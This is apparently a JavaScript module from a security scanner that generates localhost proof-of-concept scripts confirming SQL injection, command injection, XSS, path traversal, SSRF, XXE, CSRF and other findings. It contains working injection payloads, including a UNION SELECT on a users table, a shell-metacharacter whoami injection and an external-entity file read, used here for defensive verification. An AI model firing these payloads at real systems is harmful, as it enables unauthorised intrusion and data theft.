// PoC generator (FR-VER-2 — Phase-1 P1.1 of docs/PRD-next-gen-sast-phase1.md).
//
// Produces a runnable proof-of-concept file per finding for the top-10 CWE
// families. The output is consumed in two ways:
//
//   1. As metadata on the finding (`f.poc = { lang, code, runHint, kind }`)
//      so reports can render it inline.
//   2. By the verifier (P1.2) which executes the PoC in a sandbox and tags
//      the finding `verified-exploit` if the PoC demonstrates the vuln on
//      the discovered fixture.
//
// SAFETY: templates use intentionally-readable payloads (cat /etc/passwd,
// alert(document.domain), etc.) — they are designed to PROVE the bug exists,
// not to weaponize it. No template performs destructive actions, attempts
// privilege escalation, or makes outbound network requests beyond the
// project's own localhost endpoints. The verifier sandbox (P1.2) will deny
// network egress and write access outside the working dir as a second line
// of defense.
//
// Out of scope for P1.1:
//   - Sandbox execution.
//   - Assigning a verified-exploit verdict.
//   - Per-language template variants beyond the primary host language.
// Those land in P1.2.

import { CWE_TO_FAMILY, FAMILY_TO_PRIMARY_CWE } from './poc-cwe-map.js';

// ─── Template selectors ─────────────────────────────────────────────────────
//
// Each entry: { cwe, family, vulnContains, lang, render(finding, ctx) → code }
// `vulnContains` is an array of substrings; the first matching template wins.
// `render` returns the PoC body. The harness wraps it.

const TEMPLATES = [
  {
    cwe: 'CWE-89',
    family: 'sql-injection',
    vulnContains: ['SQL Injection', 'NoSQL Injection'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates SQL injection by sending a UNION-style payload.',
      payload: `' UNION SELECT username, password FROM users--`,
      expect: 'response status 500 or body contains "syntax error" / leaked column / SQL stacktrace',
    }),
  },
  {
    cwe: 'CWE-78',
    family: 'command-injection',
    vulnContains: ['Command Injection'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates OS command injection via a shell-metacharacter payload.',
      payload: `; printf "POC_MARKER_$(whoami)\\n"`,
      expect: 'response body contains "POC_MARKER_" — the marker proves the injected command ran',
    }),
  },
  {
    cwe: 'CWE-79',
    family: 'xss',
    vulnContains: ['XSS', 'Reflected XSS', 'Stored XSS', 'DOM XSS', 'document.write'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates reflected XSS by checking the script payload appears unencoded.',
      payload: `"><script>__POC_XSS_${Math.random().toString(36).slice(2, 8)}</script>`,
      expect: 'response body contains the literal <script> payload (proves no HTML encoding)',
    }),
  },
  {
    cwe: 'CWE-22',
    family: 'path-traversal',
    vulnContains: ['Path Traversal'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates path traversal by reading a sentinel file outside the intended dir.',
      payload: `../../../../../../etc/hostname`,
      expect: 'response body contains a hostname-shaped string (lowercased letters/digits, no traversal markers)',
    }),
  },
  {
    cwe: 'CWE-918',
    family: 'ssrf',
    vulnContains: ['SSRF'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.',
      // Use a port we own in the verifier sandbox; never the real cloud metadata IP.
      payload: `http://127.0.0.1:65533/poc-ssrf-sentinel`,
      expect: 'sentinel server logs a request from the target — proves the target made an outbound call we controlled',
    }),
  },
  {
    cwe: 'CWE-94',
    family: 'code-injection',
    vulnContains: ['Code Injection', 'VM Sandbox'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates JS code injection via an eval-ed expression with a side effect.',
      // Set a global; the target evals it; we check it via a second request to a debug endpoint.
      payload: `1; (globalThis.__POC_CODE_INJ__ = "yes"); 1`,
      expect: 'server-side __POC_CODE_INJ__ becomes "yes" — observe via /debug or via observing 200 with no exception',
    }),
  },
  {
    cwe: 'CWE-352',
    family: 'csrf',
    vulnContains: ['CSRF', 'Missing CSRF protection'],
    lang: 'node',
    kind: 'http-csrf',
    render: (f, ctx) => _csrfPocNode(ctx),
  },
  {
    cwe: 'CWE-601',
    family: 'open-redirect',
    vulnContains: ['Open Redirect'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates open redirect by checking Location header points at attacker-controlled host.',
      payload: `https://poc-attacker.invalid/`,
      expect: 'response status 30x AND Location header starts with https://poc-attacker.invalid/',
      noFollow: true,
    }),
  },
  {
    cwe: 'CWE-611',
    family: 'xxe',
    vulnContains: ['XXE', 'Unsafe XML Parsing'],
    lang: 'node',
    kind: 'http-xml',
    render: (f, ctx) => _xxePocNode(ctx),
  },
  {
    cwe: 'CWE-502',
    family: 'insecure-deserialization',
    vulnContains: ['Insecure Deserialization', 'Insecure Java Deserialization', 'Unsafe Deserialization'],
    lang: 'node',
    kind: 'http-payload',
    render: (f, ctx) => _httpPocNode(ctx, {
      header: 'Demonstrates unsafe deserialization with a benign marker-emitting payload.',
      payload: `{"__class__":"PocMarker","value":"deserialization-reached"}`,
      expect: 'server-side log includes "PocMarker" — proves the deserialization callback fired',
    }),
  },
];

// ─── PoC harness templates (Node.js) ────────────────────────────────────────
//
// Generic harness wraps the payload in a self-contained Node script with:
//   - one fetch() call to the discovered route
//   - exit 0 on demonstrated exploit, non-zero otherwise
//   - all observations printed to stderr for the verifier to parse

function _httpPocNode(ctx, { header, payload, expect, noFollow = false }) {
  const url = ctx.url || 'http://localhost:3000/REPLACE-WITH-ENDPOINT';
  const method = (ctx.method || 'POST').toUpperCase();
  const param = ctx.param || 'input';
  const safePayload = String(payload).replace(/`/g, '\\`').replace(/\$/g, '\\$');
  return `// ${header}
// Endpoint:   ${method} ${url}
// Payload:    ${safePayload.slice(0, 120)}${safePayload.length > 120 ? '…' : ''}
// Expect:     ${expect}
// Run:        node poc.mjs
// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error

const URL_ = ${JSON.stringify(url)};
const METHOD = ${JSON.stringify(method)};
const PAYLOAD = \`${safePayload}\`;

const body = METHOD === 'GET'
  ? null
  : JSON.stringify({ ${JSON.stringify(param)}: PAYLOAD });

const headers = { 'Content-Type': 'application/json' };

const reqUrl = METHOD === 'GET'
  ? URL_ + (URL_.includes('?') ? '&' : '?') + ${JSON.stringify(param)} + '=' + encodeURIComponent(PAYLOAD)
  : URL_;

try {
  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: ${noFollow ? "'manual'" : "'follow'"} });
  const text = await r.text();
  const sig = ${_evidenceSignal(expect, payload)};
  if (sig) {
    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');
    process.exit(0);
  }
  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');
  process.exit(1);
} catch (e) {
  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');
  process.exit(2);
}
`;
}

function _evidenceSignal(expect, payload) {
  // Produce a JS expression that returns a non-empty string on demonstrated
  // exploit. Each template's evidence shape differs slightly; we infer from
  // the `expect` and `payload` what to check for.
  const exp = String(expect || '').toLowerCase();
  if (exp.includes('marker_')) return `(text.match(/POC_MARKER_\\w+/)?.[0] ?? '')`;
  if (exp.includes('script>') || exp.includes('unencoded')) return `(text.includes('<script>__POC_XSS') ? 'unencoded <script> in response' : '')`;
  if (exp.includes('syntax error') || exp.includes('sql')) return `(/syntax error|psql|mysql|sqlite|near \"/i.test(text) ? 'sql error reflected' : '')`;
  if (exp.includes('hostname')) return `(text && /^[a-z0-9\\-]+$/i.test(text.trim().slice(0, 64)) ? 'hostname-shaped response' : '')`;
  if (exp.includes('location header')) return `(r.status >= 300 && r.status < 400 && r.headers.get('location')?.startsWith('https://poc-attacker.invalid') ? 'redirect to attacker host' : '')`;
  if (exp.includes('pocmarker') || exp.includes('marker')) return `(text.includes('PocMarker') ? 'deserialization marker echoed' : '')`;
  if (exp.includes('__poc_code_inj__')) return `(r.status === 200 ? 'code-eval accepted (200 with no error)' : '')`;
  // Default: presence of the payload string itself reflected in response.
  return `(text.includes(${JSON.stringify(String(payload).slice(0, 40))}) ? 'payload reflected' : '')`;
}

function _csrfPocNode(ctx) {
  const url = ctx.url || 'http://localhost:3000/REPLACE-WITH-ENDPOINT';
  return `// Demonstrates CSRF by making a state-changing request from an off-origin
// context with NO csrf token AND a cookie-only session — if it succeeds,
// the route is unprotected.
// Run:       node poc.mjs
// Exit code: 0 = state-changing request accepted (vulnerable), 1 = rejected

const URL_ = ${JSON.stringify(url)};
const ATTACKER_ORIGIN = 'https://attacker.invalid';

try {
  const r = await fetch(URL_, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Origin: ATTACKER_ORIGIN, Referer: ATTACKER_ORIGIN + '/' },
    body: JSON.stringify({ csrfMarker: 'forged' }),
    redirect: 'manual',
  });
  if (r.status >= 200 && r.status < 300) {
    process.stderr.write('PoC: route accepted forged-origin state-change (status ' + r.status + ')\\n');
    process.exit(0);
  }
  process.stderr.write('PoC: route rejected (status ' + r.status + ') — possibly CSRF-protected\\n');
  process.exit(1);
} catch (e) {
  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');
  process.exit(2);
}
`;
}

function _xxePocNode(ctx) {
  const url = ctx.url || 'http://localhost:3000/REPLACE-WITH-ENDPOINT';
  return `// Demonstrates XXE by submitting an XML body that references an external
// entity. We pin to a local sentinel file the verifier sandbox provides.
// Run:       node poc.mjs
// Exit code: 0 = sentinel content appears in response (XXE confirmed), 1 = not

const URL_ = ${JSON.stringify(url)};
const SENTINEL = '/tmp/poc-xxe-sentinel-' + Math.random().toString(36).slice(2,8);

const XML = \`<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file://\${SENTINEL}">]>
<root>&xxe;</root>\`;

try {
  // Verifier sandbox writes SENTINEL with a known string before running this PoC.
  const r = await fetch(URL_, { method: 'POST', headers: { 'Content-Type': 'application/xml' }, body: XML });
  const text = await r.text();
  if (text.includes('XXE_SENTINEL_CONTENT')) {
    process.stderr.write('PoC: XXE confirmed — sentinel content leaked into response\\n');
    process.exit(0);
  }
  process.stderr.write('PoC: payload accepted (status ' + r.status + '), no sentinel content in response\\n');
  process.exit(1);
} catch (e) {
  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');
  process.exit(2);
}
`;
}

// ─── Public API ─────────────────────────────────────────────────────────────

/**
 * Select a template for a finding. Returns the template object or null.
 */
function pickTemplate(finding) {
  if (!finding || typeof finding !== 'object') return null;
  const vuln = String(finding.vuln || '');
  const cwe = String(finding.cwe || '').toUpperCase();
  for (const t of TEMPLATES) {
    if (t.cwe === cwe) return t;
  }
  for (const t of TEMPLATES) {
    if (t.vulnContains.some(substr => vuln.includes(substr))) return t;
  }
  return null;
}

/**
 * Resolve the HTTP endpoint context for a finding from the project's
 * discovered route list. Returns { url, method, param } or null.
 */
function endpointFor(finding, routes) {
  if (!Array.isArray(routes) || routes.length === 0) return null;
  // Match by file + line proximity.
  const fp = finding.file || finding.sink?.file;
  const ln = finding.line || finding.sink?.line || 0;
  if (!fp) return null;
  let best = null;
  let bestDist = Infinity;
  for (const r of routes) {
    if (r.file !== fp) continue;
    const dist = Math.abs((r.line || 0) - ln);
    if (dist < bestDist) { bestDist = dist; best = r; }
  }
  if (!best) return null;
  return {
    url: 'http://localhost:3000' + (best.path || '/REPLACE-WITH-ENDPOINT'),
    method: best.method || 'POST',
    // Best-effort guess at the tainted parameter name from the finding's source.
    param: finding.source?.variable || 'input',
  };
}

/**
 * Generate a PoC object for a finding. Returns:
 *   { lang, code, runHint, kind, cwe } when a template matches.
 *   null when no template covers this CWE family in v1.
 */
export function generatePoc(finding, { routes = [] } = {}) {
  const t = pickTemplate(finding);
  if (!t) return null;
  const ctx = endpointFor(finding, routes) || {};
  let code;
  try { code = t.render(finding, ctx); }
  catch (e) {
    // Fail-closed: an exception in a template never crashes the scan.
    return null;
  }
  if (!code || typeof code !== 'string' || code.length < 50) return null;
  return {
    lang: t.lang,
    kind: t.kind,
    cwe: t.cwe,
    family: t.family,
    runHint: t.lang === 'node' ? 'node poc.mjs' :
             t.lang === 'python' ? 'python3 poc.py' :
             t.lang === 'java' ? 'javac PoC.java && java PoC' :
             null,
    code,
  };
}

/**
 * Annotate findings with PoCs. Used by the engine's emit pipeline.
 *
 * Sets `f.poc` to either the generated PoC object or `null` (explicit "no
 * template covers this CWE family in v1"). Never throws.
 */
export function annotatePocs(findings, opts = {}) {
  const routes = opts.routes || [];
  if (!Array.isArray(findings)) return;
  for (const f of findings) {
    if (!f || typeof f !== 'object') continue;
    f.poc = generatePoc(f, { routes });
  }
}

// Surface table of CWE → family → primary lang → expected PoC presence for
// the reporter to render coverage in the "what we can/can't prove" section.
export function pocCoverageSummary(findings) {
  const summary = { withPoc: 0, withoutPoc: 0, byFamily: {} };
  for (const f of findings) {
    if (!f || typeof f !== 'object') continue;
    const fam = f.family || 'unknown';
    summary.byFamily[fam] ||= { withPoc: 0, withoutPoc: 0 };
    if (f.poc) { summary.withPoc++; summary.byFamily[fam].withPoc++; }
    else       { summary.withoutPoc++; summary.byFamily[fam].withoutPoc++; }
  }
  return summary;
}

// For tests and the no-dead-modules check — surfaces template count.
export function _templateCount() { return TEMPLATES.length; }
export const _knownCwes = TEMPLATES.map(t => t.cwe);
